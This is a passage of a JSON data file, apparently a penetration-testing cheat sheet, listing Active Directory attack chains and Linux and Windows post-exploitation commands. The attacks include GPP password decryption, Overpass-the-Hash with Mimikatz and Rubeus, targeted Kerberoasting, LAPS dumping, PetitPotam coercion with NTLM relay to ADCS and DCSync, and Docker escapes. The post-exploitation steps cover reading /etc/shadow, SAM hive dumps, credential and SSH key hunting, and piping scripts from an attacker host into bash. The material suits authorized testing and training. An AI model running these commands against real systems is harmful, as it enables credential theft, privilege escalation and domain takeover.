                  "subdesc": "When to use: Always check SYSVOL for leftover GPP XML files if the domain has older DCs or hasn't been cleaned up. Patched in MS14-025 but old credentials may still exist. Group Policy Preferences allowed admins to create policies using embedded credentials. These credentials were encrypted with a \"cPassword\" key that Microsoft accidentally published. Although patched in MS14-025, previously stored credentials are NOT removed by the patch.",
                  "cmd": [
                    "# Decrypt a cPassword found in GPP XML files in SYSVOL",
                    "gpp-decrypt <CPASSWORD>",
                    "",
                    "# Search SYSVOL for GPP files with passwords",
                    "findstr /S /I \"cpassword\" \\\\<DC>\\SYSVOL\\<DOMAIN>\\Policies\\*.xml"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-21",
          "name": "Overpass-the-Hash (OPTH)",
          "description": "When to use: You have an NTLM hash and need a Kerberos ticket (TGT) instead. Some environments block NTLM authentication but allow Kerberos. OPTH converts an NTLM hash into a usable Kerberos TGT.",
          "commands": [
            {
              "desc": "Overpass-the-Hash (OPTH)",
              "entries": [
                {
                  "subdesc": "When to use: You have an NTLM hash and need a Kerberos ticket (TGT) instead. Some environments block NTLM authentication but allow Kerberos. OPTH converts an NTLM hash into a usable Kerberos TGT.",
                  "cmd": [
                    "# From Linux with Impacket — request TGT using NTLM hash",
                    "impacket-getTGT <DOMAIN>/<USER> -hashes :<NTLM-HASH> -dc-ip <DC-IP>",
                    "",
                    "# Use the resulting TGT",
                    "export KRB5CCNAME=<USER>.ccache",
                    "impacket-psexec <DOMAIN>/<USER>@<TARGET> -k -no-pass",
                    "impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -k -no-pass"
                  ]
                },
                {
                  "cmd": [
                    ":: From Windows with Mimikatz — inject NTLM hash and request Kerberos TGT",
                    "mimikatz# sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe",
                    "",
                    ":: The spawned cmd.exe now has a Kerberos TGT for the target user",
                    ":: Verify with: klist"
                  ]
                },
                {
                  "cmd": [
                    "# From Windows with Rubeus — request TGT from hash",
                    ".\\Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM-HASH> /ptt",
                    "",
                    "# Verify ticket was injected",
                    "klist"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-22",
          "name": "Targeted Kerberoasting (GenericAll/GenericWrite Abuse)",
          "description": "When to use: You have GenericAll or GenericWrite over a user account (check BloodHound). You can set an SPN on the account, Kerberoast it to get the hash, then crack offline.",
          "commands": [
            {
              "desc": "Targeted Kerberoasting (GenericAll/GenericWrite Abuse)",
              "entries": [
                {
                  "subdesc": "When to use: You have GenericAll or GenericWrite over a user account (check BloodHound). You can set an SPN on the account, Kerberoast it to get the hash, then crack offline.",
                  "cmd": [
                    "# Step 1: Set an SPN on the target user",
                    "# From Linux with Impacket",
                    "python3 targetedKerberoast.py -u <USER> -p '<PASS>' -d <DOMAIN> --dc-ip <DC-IP>",
                    "",
                    "# Or manually set SPN with PowerView",
                    "Set-DomainObject -Identity <TARGET-USER> -SET @{serviceprincipalname='fake/spn'} -Verbose",
                    "",
                    "# Step 2: Kerberoast the target",
                    "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request -outputfile targeted.txt",
                    "",
                    "# Step 3: Crack the hash",
                    "hashcat -m 13100 targeted.txt /usr/share/wordlists/rockyou.txt",
                    "",
                    "# Step 4: Clean up — remove the SPN",
                    "Set-DomainObject -Identity <TARGET-USER> -Clear serviceprincipalname -Verbose"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-23",
          "name": "LAPS Enumeration (Local Administrator Password Solution)",
          "description": "When to check: LAPS stores unique local admin passwords for each domain computer in AD. If you can read the ms-Mcs-AdmPwd attribute, you get the local admin password for that machine.",
          "commands": [
            {
              "desc": "LAPS Enumeration (Local Administrator Password Solution)",
              "entries": [
                {
                  "subdesc": "When to check: LAPS stores unique local admin passwords for each domain computer in AD. If you can read the ms-Mcs-AdmPwd attribute, you get the local admin password for that machine.",
                  "cmd": [
                    "# From Linux — check if LAPS is deployed and dump passwords",
                    "nxc ldap <DC-IP> -u <USER> -p <PASS> -M laps",
                    "",
                    "# With ldapsearch",
                    "ldapsearch -x -H ldap://<DC-IP> -D '<DOMAIN>\\<USER>' -w '<PASS>' -b \"DC=domain,DC=com\" \"(ms-Mcs-AdmPwdExpirationTime=*)\" ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime sAMAccountName"
                  ]
                },
                {
                  "cmd": [
                    "# From Windows with PowerView",
                    "Get-DomainComputer | Where-Object {$_.'ms-Mcs-AdmPwd'} | Select DNSHostName, ms-Mcs-AdmPwd",
                    "",
                    "# With native AD module",
                    "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime | Where-Object {$_.'ms-Mcs-AdmPwd'} | Select Name, 'ms-Mcs-AdmPwd'",
                    "",
                    "# LAPSToolkit (if available)",
                    "Get-LAPSComputers"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "ad-24",
          "name": "Coercion Attacks (Authentication Forcing)",
          "description": "Purpose: Force a remote machine (often a DC) to authenticate to your attacker-controlled server. Combine with NTLM relay (ntlmrelayx) or capture the hash with Responder. These are essential for SMB Relay and ADCS ESC8 attacks.",
          "commands": [
            {
              "desc": "PetitPotam (MS-EFSRPC)",
              "entries": [
                {
                  "cmd": [
                    "# Unauthenticated coercion (if available — patched in newer systems)",
                    "python3 PetitPotam.py <ATTACKER-IP> <DC-IP>",
                    "",
                    "# Authenticated coercion (works on patched systems with valid creds)",
                    "python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER-IP> <DC-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "PrinterBug / SpoolSample (MS-RPRN)",
              "entries": [
                {
                  "cmd": [
                    "# Requires valid domain credentials + Print Spooler service running on target",
                    "# Check if Print Spooler is running:",
                    "nxc smb <TARGET> -u <USER> -p <PASS> -M spooler",
                    "",
                    "# Force authentication",
                    "python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<DC-IP> <ATTACKER-IP>",
                    "",
                    "# Windows alternative",
                    ".\\SpoolSample.exe <DC-HOSTNAME> <ATTACKER-HOSTNAME>"
                  ]
                }
              ]
            },
            {
              "desc": "DFSCoerce (MS-DFSNM)",
              "entries": [
                {
                  "cmd": [
                    "# Another coercion method — targets DFS service",
                    "python3 dfscoerce.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER-IP> <DC-IP>"
                  ]
                }
              ]
            },
            {
              "desc": "Coercion + Relay Workflow",
              "entries": [
                {
                  "cmd": [
                    "# Common attack chain:",
                    "# 1. Start ntlmrelayx targeting ADCS web enrollment (ESC8)",
                    "impacket-ntlmrelayx -t http://<CA-IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
                    "",
                    "# 2. Coerce DC authentication",
                    "python3 PetitPotam.py <ATTACKER-IP> <DC-IP>",
                    "",
                    "# 3. ntlmrelayx automatically requests a certificate",
                    "# 4. Use the certificate to get the DC's NTLM hash",
                    "certipy-ad auth -pfx dc.pfx -dc-ip <DC-IP>",
                    "",
                    "# 5. DCSync with the DC machine account hash",
                    "impacket-secretsdump <DOMAIN>/'DC$'@<DC-IP> -hashes :<HASH>"
                  ]
                }
              ]
            }
          ]
        }
    ]
  },

  /* ─── Phase 5: Post-Exploitation ──────────────────────── */
  {
    "id": "post_exploitation",
    "name": "Post-Exploitation",
    "optional": false,
    "items": [
        {
          "id": "post-1",
          "name": "Linux: User & Identity Enumeration",
          "description": "Run immediately after landing a shell. Identifies who you are, what groups you belong to, and whether any other users have interesting privileges. Check sudo -l first — it's the #1 fastest privesc vector on Linux.",
          "commands": [
            {
              "desc": "User & Identity Enumeration",
              "entries": [
                {
                  "subdesc": "Run immediately after landing a shell. Identifies who you are, what groups you belong to, and whether any other users have interesting privileges. Check sudo -l first — it's the #1 fastest privesc vector on Linux.",
                  "cmd": [
                    "# Current user and UID",
                    "whoami",
                    "id",
                    "",
                    "# User's groups",
                    "groups",
                    "",
                    "# All users on the system",
                    "cat /etc/passwd",
                    "cat /etc/passwd | grep -v nologin | grep -v false",
                    "",
                    "# Users with shells",
                    "grep -E '/bin/(bash|sh|zsh|fish)' /etc/passwd",
                    "",
                    "# Sudo privileges for current user",
                    "sudo -l",
                    "",
                    "# Currently logged-in users",
                    "w",
                    "who",
                    "last -a | head -20",
                    "",
                    "# Password hashes (if readable)",
                    "cat /etc/shadow"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-2",
          "name": "Linux: System Information",
          "description": "Collect OS and kernel details for exploit matching. The kernel version (uname -r) is critical for identifying kernel exploits (DirtyCow, DirtyPipe, PwnKit). Environment variables may leak credentials, paths, or internal hostnames.",
          "commands": [
            {
              "desc": "System Information",
              "entries": [
                {
                  "subdesc": "Collect OS and kernel details for exploit matching. The kernel version (uname -r) is critical for identifying kernel exploits (DirtyCow, DirtyPipe, PwnKit). Environment variables may leak credentials, paths, or internal hostnames.",
                  "cmd": [
                    "# OS and kernel version",
                    "uname -a",
                    "cat /etc/os-release",
                    "cat /etc/issue",
                    "lsb_release -a 2>/dev/null",
                    "",
                    "# Hostname",
                    "hostname",
                    "",
                    "# Architecture",
                    "arch",
                    "uname -m",
                    "",
                    "# Kernel version (for exploit matching)",
                    "uname -r",
                    "",
                    "# Uptime",
                    "uptime",
                    "",
                    "# Environment variables",
                    "env",
                    "printenv",
                    "cat /proc/self/environ"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-3",
          "name": "Linux: Network Enumeration",
          "description": "Map the internal network topology. Reveals dual-homed interfaces (pivot opportunities), internal DNS servers, active connections to other machines, and firewall rules that may block your reverse shells. ARP cache shows recently contacted hosts.",
          "commands": [
            {
              "desc": "Network Enumeration",
              "entries": [
                {
                  "subdesc": "Map the internal network topology. Reveals dual-homed interfaces (pivot opportunities), internal DNS servers, active connections to other machines, and firewall rules that may block your reverse shells. ARP cache shows recently contacted hosts.",
                  "cmd": [
                    "# Network interfaces",
                    "ip addr show",
                    "ifconfig -a",
                    "",
                    "# Routing table",
                    "ip route",
                    "route -n",
                    "",
                    "# ARP cache",
                    "arp -a",
                    "ip neigh",
                    "",
                    "# Active connections and listening ports",
                    "ss -tulnp",
                    "netstat -tulnp",
                    "netstat -ano",
                    "",
                    "# DNS configuration",
                    "cat /etc/resolv.conf",
                    "",
                    "# Hosts file",
                    "cat /etc/hosts",
                    "",
                    "# Firewall rules",
                    "iptables -L -n -v 2>/dev/null",
                    "nft list ruleset 2>/dev/null"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-4",
          "name": "Linux: Service & Process Enumeration",
          "description": "Identify running services and scheduled tasks. Processes running as root are potential privesc targets. Cron jobs are a goldmine — look for writable scripts executed by root, wildcard injection opportunities, and PATH hijacking. Systemd timers serve the same purpose as cron.",
          "commands": [
            {
              "desc": "Service & Process Enumeration",
              "entries": [
                {
                  "subdesc": "Identify running services and scheduled tasks. Processes running as root are potential privesc targets. Cron jobs are a goldmine — look for writable scripts executed by root, wildcard injection opportunities, and PATH hijacking. Systemd timers serve the same purpose as cron.",
                  "cmd": [
                    "# Running processes (all users)",
                    "ps auxwwf",
                    "ps -ef",
                    "",
                    "# Services",
                    "systemctl list-units --type=service --state=running",
                    "service --status-all 2>/dev/null",
                    "",
                    "# Cron jobs (privilege escalation goldmine)",
                    "crontab -l",
                    "ls -la /etc/cron*",
                    "cat /etc/crontab",
                    "for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done",
                    "",
                    "# Systemd timers",
                    "systemctl list-timers --all",
                    "",
                    "# Installed packages",
                    "dpkg -l 2>/dev/null         # Debian/Ubuntu",
                    "rpm -qa 2>/dev/null          # RHEL/CentOS"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-5",
          "name": "Linux: File System & Sensitive Files",
          "description": "Hunt for misconfigurations and sensitive data. SUID/SGID binaries are the most common privesc vector after sudo — cross-reference with GTFOBins. Files with capabilities (getcap) are equally dangerous. Search for passwords in config files, SSH keys left behind, and database files containing credentials.",
          "commands": [
            {
              "desc": "File System & Sensitive Files",
              "entries": [
                {
                  "subdesc": "Hunt for misconfigurations and sensitive data. SUID/SGID binaries are the most common privesc vector after sudo — cross-reference with GTFOBins. Files with capabilities (getcap) are equally dangerous. Search for passwords in config files, SSH keys left behind, and database files containing credentials.",
                  "cmd": [
                    "# SUID binaries (potential privesc)",
                    "find / -perm -4000 -type f 2>/dev/null",
                    "",
                    "# SGID binaries",
                    "find / -perm -2000 -type f 2>/dev/null",
                    "",
                    "# World-writable files",
                    "find / -writable -type f 2>/dev/null | grep -v proc",
                    "",
                    "# World-writable directories",
                    "find / -writable -type d 2>/dev/null",
                    "",
                    "# Files with capabilities",
                    "getcap -r / 2>/dev/null",
                    "",
                    "# Configuration files with passwords",
                    "grep -rl 'password' /etc/ 2>/dev/null",
                    "grep -ri 'password\\|passwd\\|pwd' /var/www/ 2>/dev/null",
                    "find / -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | head -30",
                    "",
                    "# SSH keys",
                    "find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null",
                    "find / -name 'authorized_keys' 2>/dev/null",
                    "",
                    "# Database files",
                    "find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null",
                    "",
                    "# History files",
                    "cat ~/.bash_history",
                    "cat ~/.mysql_history",
                    "cat ~/.python_history"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-6",
          "name": "Linux: NFS & Mounted Shares",
          "description": "Check for NFS misconfigurations. Exports with no_root_squash allow you to mount the share as root on your attacker machine, place a SUID binary, and execute it on the target for instant root. Also check fstab for credentials in mount options.",
          "commands": [
            {
              "desc": "NFS & Mounted Shares",
              "entries": [
                {
                  "subdesc": "Check for NFS misconfigurations. Exports with no_root_squash allow you to mount the share as root on your attacker machine, place a SUID binary, and execute it on the target for instant root. Also check fstab for credentials in mount options.",
                  "cmd": [
                    "# Mounted filesystems",
                    "mount",
                    "df -h",
                    "",
                    "# NFS exports (check for no_root_squash)",
                    "cat /etc/exports",
                    "showmount -e <TARGET-IP>",
                    "",
                    "# Fstab entries",
                    "cat /etc/fstab"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-7",
          "name": "Linux: Domain-Joined Linux",
          "description": "Check if the Linux host is joined to Active Directory. Domain-joined Linux machines have SSSD/Kerberos configs that may contain credentials or keytab files. Cached Kerberos tickets (krb5cc_*) can be used for lateral movement into the Windows domain.",
          "commands": [
            {
              "desc": "Domain-Joined Linux",
              "entries": [
                {
                  "subdesc": "Check if the Linux host is joined to Active Directory. Domain-joined Linux machines have SSSD/Kerberos configs that may contain credentials or keytab files. Cached Kerberos tickets (krb5cc_*) can be used for lateral movement into the Windows domain.",
                  "cmd": [
                    "# Check if joined to Active Directory",
                    "realm list",
                    "realm status",
                    "",
                    "# SSSD configuration",
                    "cat /etc/sssd/sssd.conf",
                    "",
                    "# Kerberos configuration",
                    "cat /etc/krb5.conf",
                    "",
                    "# Cached Kerberos tickets",
                    "klist",
                    "find / -name 'krb5cc_*' -o -name '*.keytab' 2>/dev/null"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-8",
          "name": "Linux: Discovering KDBX files",
          "description": "Search for KeePass database files. KDBX files are password manager databases that may contain credentials for other systems. Extract and crack them with keepass2john and john/hashcat. <empty-block/>",
          "commands": [
            {
              "desc": "Discovering KDBX files",
              "entries": [
                {
                  "subdesc": "Search for KeePass database files. KDBX files are password manager databases that may contain credentials for other systems. Extract and crack them with keepass2john and john/hashcat.",
                  "cmd": [
                    "find / -name *.kdbx 2>/dev/null"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-9",
          "name": "Linux: Automated Enumeration Tools",
          "description": "Automated Enumeration Tools",
          "commands": [
            {
              "desc": "LinPEAS",
              "entries": [
                {
                  "subdesc": "The go-to automated enumeration script. Highlights privilege escalation vectors in color-coded output. The -a flag runs all checks. Always pipe output to a file — it generates a LOT of data. Look for RED/YELLOW highlighted findings first.",
                  "cmd": [
                    "# Download and run",
                    "curl -L http://<ATTACKER-IP>/linpeas.sh | bash",
                    "",
                    "# Or download first",
                    "wget http://<ATTACKER-IP>/linpeas.sh",
                    "chmod +x linpeas.sh",
                    "./linpeas.sh -a 2>&1 | tee linpeas_output.txt"
                  ]
                }
              ]
            },
            {
              "desc": "LinEnum",
              "entries": [
                {
                  "subdesc": "Alternative to LinPEAS with cleaner output. Less noisy, focuses on key enumeration areas. Use -t for thorough mode and -r to generate a report file.",
                  "cmd": [
                    "wget http://<ATTACKER-IP>/LinEnum.sh",
                    "chmod +x LinEnum.sh",
                    "./LinEnum.sh -t -r report.txt"
                  ]
                }
              ]
            },
            {
              "desc": "linux-exploit-suggester",
              "entries": [
                {
                  "subdesc": "Matches the target kernel version against known kernel exploits. Run this after collecting uname -r output. Suggests specific CVEs and provides exploit download links. Useful for identifying DirtyCow, DirtyPipe, PwnKit, and other kernel-level privesc vectors.",
                  "cmd": [
                    "wget http://<ATTACKER-IP>/linux-exploit-suggester.sh",
                    "chmod +x linux-exploit-suggester.sh",
                    "./linux-exploit-suggester.sh"
                  ]
                }
              ]
            },
            {
              "desc": "pspy (Process Monitor — No Root Required)",
              "entries": [
                {
                  "subdesc": "Monitors all running processes and cron jobs in real-time without root. Essential when crontab -l shows nothing — pspy catches processes spawned by other users and root cron jobs that aren't visible to your user. Let it run for 2-5 minutes and watch for recurring commands.",
                  "cmd": [
                    "# Monitor running processes and cron jobs in real-time",
                    "wget http://<ATTACKER-IP>/pspy64",
                    "chmod +x pspy64",
                    "./pspy64",
                    "# Watch for processes running as root that you can hijack"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-10",
          "name": "Linux: Docker / Container Enumeration",
          "description": "When to check: Always determine if you’re inside a container. If so, the real target is breaking out to the host.",
          "commands": [
            {
              "desc": "Am I in a Container?",
              "entries": [
                {
                  "cmd": [
                    "# Check for .dockerenv file (definitive indicator)",
                    "ls -la /.dockerenv",
                    "",
                    "# Check cgroup (container cgroup names contain \"docker\" or \"lxc\")",
                    "cat /proc/1/cgroup | grep -i \"docker\\|lxc\\|kubepods\"",
                    "",
                    "# Very low PID count suggests a container",
                    "ps aux | wc -l",
                    "",
                    "# Hostname is often a short hex string in containers",
                    "hostname",
                    "",
                    "# Missing common binaries/directories",
                    "ls /boot  # Empty or missing in containers"
                  ]
                }
              ]
            },
            {
              "desc": "Docker Socket Access (Container Escape)",
              "entries": [
                {
                  "cmd": [
                    "# Check if docker socket is mounted (critical finding!)",
                    "ls -la /var/run/docker.sock",
                    "",
                    "# If accessible — you can create a privileged container mounting the host filesystem",
                    "docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host sh",
                    "",
                    "# Or use the API directly",
                    "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json"
                  ]
                }
              ]
            },
            {
              "desc": "Docker Group Escape",
              "entries": [
                {
                  "cmd": [
                    "# If current user is in the docker group:",
                    "id | grep docker",
                    "",
                    "# Mount host filesystem",
                    "docker run -v /:/hostfs -it alpine /bin/sh",
                    "# Full host access at /hostfs",
                    "cat /hostfs/etc/shadow",
                    "cat /hostfs/root/proof.txt"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-11",
          "name": "Linux: Credential Hunting in Config Files",
          "description": "Web apps and services frequently store database credentials, API keys, and passwords in configuration files.",
          "commands": [
            {
              "desc": "Web Application Configs",
              "entries": [
                {
                  "cmd": [
                    "# WordPress",
                    "cat /var/www/html/wp-config.php 2>/dev/null | grep -i \"db_\\|password\\|secret\"",
                    "",
                    "# Joomla",
                    "cat /var/www/html/configuration.php 2>/dev/null | grep -i \"password\\|secret\\|user\"",
                    "",
                    "# Drupal",
                    "cat /var/www/html/sites/default/settings.php 2>/dev/null | grep -i \"password\\|database\"",
                    "",
                    "# Laravel / PHP frameworks",
                    "cat /var/www/html/.env 2>/dev/null",
                    "find /var/www/ -name \".env\" 2>/dev/null",
                    "",
                    "# Generic search for password strings in web directories",
                    "grep -rli \"password\\|passwd\\|pwd\\|secret\\|api_key\\|token\" /var/www/ 2>/dev/null"
                  ]
                }
              ]
            },
            {
              "desc": "Git Repositories",
              "entries": [
                {
                  "cmd": [
                    "# Find exposed .git directories",
                    "find / -name \".git\" -type d 2>/dev/null",
                    "",
                    "# Check git history for leaked credentials",
                    "cd /var/www/html/.git 2>/dev/null",
                    "git log --oneline",
                    "git log -p  # Show diffs — look for removed passwords",
                    "git show <COMMIT-HASH>",
                    "git diff HEAD~5  # Last 5 commits",
                    "",
                    "# Search all commits for password strings",
                    "git log -p --all -S 'password' -- '*.php' '*.py' '*.conf' '*.env'"
                  ]
                }
              ]
            },
            {
              "desc": "Database Config Files",
              "entries": [
                {
                  "cmd": [
                    "# MySQL/MariaDB",
                    "cat /etc/mysql/debian.cnf 2>/dev/null",
                    "cat /etc/mysql/my.cnf 2>/dev/null",
                    "cat /root/.my.cnf 2>/dev/null",
                    "",
                    "# PostgreSQL",
                    "cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null",
                    "find / -name \"pgpass\" -o -name \".pgpass\" 2>/dev/null",
                    "",
                    "# MongoDB",
                    "cat /etc/mongod.conf 2>/dev/null"
                  ]
                }
              ]
            },
            {
              "desc": "Broad Credential Search",
              "entries": [
                {
                  "cmd": [
                    "# Search for files containing password-like strings",
                    "grep -rli \"password\\|passwd\\|credential\\|secret\" /etc/ /opt/ /home/ /var/ 2>/dev/null | head -30",
                    "",
                    "# Find recently modified config files (may indicate active use)",
                    "find /etc /opt /var/www -name \"*.conf\" -o -name \"*.config\" -o -name \"*.ini\" -o -name \"*.env\" -mtime -30 2>/dev/null",
                    "",
                    "# Find backup files that may contain old credentials",
                    "find / -name \"*.bak\" -o -name \"*.old\" -o -name \"*.backup\" -o -name \"*.swp\" -o -name \"*~\" 2>/dev/null | head -20"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-12",
          "name": "Linux: Bash History & Shell Configs",
          "description": "Bash History & Shell Configs",
          "commands": [
            {
              "desc": "Bash History & Shell Configs",
              "entries": [
                {
                  "cmd": [
                    "# Current user history",
                    "cat ~/.bash_history",
                    "cat ~/.zsh_history",
                    "",
                    "# All users' history (requires read access)",
                    "find /home -name \".bash_history\" -exec echo \"=== {} ===\" \\; -exec cat {} \\; 2>/dev/null",
                    "cat /root/.bash_history 2>/dev/null",
                    "",
                    "# Shell RC files may contain aliases with credentials",
                    "cat ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null | grep -i \"alias\\|export\\|password\\|key\\|token\""
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-13",
          "name": "Linux: SSH Keys & Config",
          "description": "SSH Keys & Config",
          "commands": [
            {
              "desc": "SSH Keys & Config",
              "entries": [
                {
                  "cmd": [
                    "# Check all users for SSH keys",
                    "find /home -name \"id_rsa\" -o -name \"id_ecdsa\" -o -name \"id_ed25519\" 2>/dev/null",
                    "find /root/.ssh/ -type f 2>/dev/null",
                    "",
                    "# Authorized keys — who can SSH in?",
                    "find / -name \"authorized_keys\" 2>/dev/null -exec echo \"=== {} ===\" \\; -exec cat {} \\;",
                    "",
                    "# SSH config — may reveal other targets, jump hosts, port forwards",
                    "cat ~/.ssh/config 2>/dev/null",
                    "cat /etc/ssh/sshd_config 2>/dev/null | grep -v \"^#\" | grep -v \"^$\"",
                    "",
                    "# Known hosts — reveals other machines this host connects to",
                    "cat ~/.ssh/known_hosts 2>/dev/null"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-14",
          "name": "Linux: Mail",
          "description": "When to check: Mail spools frequently contain password reset links, credentials, and internal communications.",
          "commands": [
            {
              "desc": "Mail",
              "entries": [
                {
                  "subdesc": "When to check: Mail spools frequently contain password reset links, credentials, and internal communications.",
                  "cmd": [
                    "# Check mail spool directories",
                    "ls -la /var/mail/",
                    "ls -la /var/spool/mail/",
                    "cat /var/mail/* 2>/dev/null",
                    "cat /var/spool/mail/* 2>/dev/null",
                    "",
                    "# Check for mail in user home directories",
                    "find /home -name \"mbox\" -o -name \".mbox\" 2>/dev/null"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-15",
          "name": "Linux: Tmux / Screen Session Hijacking",
          "description": "When to check: If another user (especially root) has a detached tmux or screen session, you may be able to attach to it and inherit their shell.",
          "commands": [
            {
              "desc": "Tmux / Screen Session Hijacking",
              "entries": [
                {
                  "subdesc": "When to check: If another user (especially root) has a detached tmux or screen session, you may be able to attach to it and inherit their shell.",
                  "cmd": [
                    "# List tmux sessions",
                    "tmux ls",
                    "",
                    "# Look for tmux sockets accessible by current user",
                    "find /tmp -name \"tmux-*\" -type d 2>/dev/null",
                    "ls -la /tmp/tmux-*/",
                    "",
                    "# Attach to a session (if permissions allow)",
                    "tmux -S /tmp/tmux-<UID>/default attach",
                    "",
                    "# List screen sessions",
                    "screen -ls",
                    "",
                    "# Attach to a detached screen session",
                    "screen -r <SESSION-ID>",
                    "",
                    "# If root has a session and you're root — just attach",
                    "screen -x root/<SESSION-ID>"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-16",
          "name": "Windows: User & Identity Enumeration",
          "description": "User & Identity Enumeration",
          "commands": [
            {
              "desc": "User & Identity Enumeration",
              "entries": [
                {
                  "cmd": [
                    ":: Current user and privileges",
                    "whoami",
                    "whoami /priv",
                    "whoami /groups",
                    "whoami /all",
                    "",
                    ":: List all local users",
                    "net user",
                    "net user <USERNAME>",
                    "",
                    ":: List local groups and members",
                    "net localgroup",
                    "net localgroup Administrators",
                    "net localgroup \"Remote Desktop Users\"",
                    "",
                    ":: Check if domain-joined",
                    "systeminfo | findstr /B /C:\"Domain\""
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-17",
          "name": "Windows: System Information",
          "description": "System Information",
          "commands": [
            {
              "desc": "System Information",
              "entries": [
                {
                  "cmd": [
                    ":: OS version, hotfixes, architecture",
                    "systeminfo",
                    "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Hotfix(s)\"",
                    "",
                    ":: Hostname",
                    "hostname",
                    "",
                    ":: Architecture (32 or 64 bit)",
                    "wmic os get osarchitecture",
                    "",
                    ":: Installed patches (look for missing KBs)",
                    "wmic qfe list full",
                    "wmic qfe get Caption,Description,HotFixID,InstalledOn",
                    "",
                    ":: Environment variables",
                    "set"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-18",
          "name": "Windows: Network Enumeration",
          "description": "Network Enumeration",
          "commands": [
            {
              "desc": "Network Enumeration",
              "entries": [
                {
                  "cmd": [
                    ":: Network interfaces and IPs",
                    "ipconfig /all",
                    "",
                    ":: Routing table",
                    "route print",
                    "",
                    ":: ARP cache (discover other hosts on the subnet)",
                    "arp -a",
                    "",
                    ":: Active connections and listening ports",
                    "netstat -ano",
                    "netstat -ano | findstr LISTENING",
                    "netstat -ano | findstr ESTABLISHED",
                    "",
                    ":: DNS cache",
                    "ipconfig /displaydns",
                    "",
                    ":: Firewall status and rules",
                    "netsh advfirewall show allprofiles",
                    "netsh advfirewall firewall show rule name=all",
                    "netsh firewall show state"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-19",
          "name": "Windows: Service & Process Enumeration",
          "description": "Service & Process Enumeration",
          "commands": [
            {
              "desc": "Service & Process Enumeration",
              "entries": [
                {
                  "cmd": [
                    ":: Running processes",
                    "tasklist /svc",
                    "tasklist /v",
                    "wmic process list brief",
                    "",
                    ":: Services (look for non-standard services)",
                    "wmic service list brief",
                    "sc query state=all",
                    "sc qc <SERVICE-NAME>",
                    "",
                    ":: Scheduled tasks",
                    "schtasks /query /fo LIST /v",
                    "",
                    ":: Installed software",
                    "wmic product get name,version",
                    "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr DisplayName"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-20",
          "name": "Windows: Credential Hunting",
          "description": "Credential Hunting",
          "commands": [
            {
              "desc": "Credential Hunting",
              "entries": [
                {
                  "cmd": [
                    ":: Search for passwords in files",
                    "findstr /si \"password\" *.txt *.xml *.ini *.config *.cfg",
                    "findstr /spin \"password\" C:\\*.txt C:\\*.ini C:\\*.xml",
                    "",
                    ":: Saved credentials",
                    "cmdkey /list",
                    "",
                    ":: WiFi passwords",
                    "netsh wlan show profiles",
                    "netsh wlan show profile name=\"<SSID>\" key=clear",
                    "",
                    ":: Registry autologon credentials",
                    "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul | findstr /i \"DefaultUserName DefaultPassword AutoAdminLogon\"",
                    "",
                    ":: SAM and SYSTEM hive locations (if accessible)",
                    "reg save HKLM\\SAM C:\\Temp\\SAM",
                    "reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM",
                    "",
                    ":: Unattend/Sysprep files",
                    "dir /s C:\\unattend.xml C:\\sysprep.inf C:\\sysprep.xml C:\\Panther\\Unattend.xml 2>nul"
                  ]
                }
              ]
            }
          ]
        },
        {
          "id": "post-21",
          "name": "Windows: Group Policy & Domain Info",
          "description": "Group Policy & Domain Info",
          "commands": [
            {
              "desc": "Group Policy & Domain Info",
              "entries": [
                {
                  "cmd": [
                    ":: Group policy results",
                    "gpresult /R",
                    "gpresult /V",
                    "",
                    ":: Domain controller",
                    "set logonserver",
                    "nltest /dsgetdc:<DOMAIN>",
                    "",
                    ":: Domain users (if domain-joined)",
                    "net user /domain",
                    "net group \"Domain Admins\" /domain",
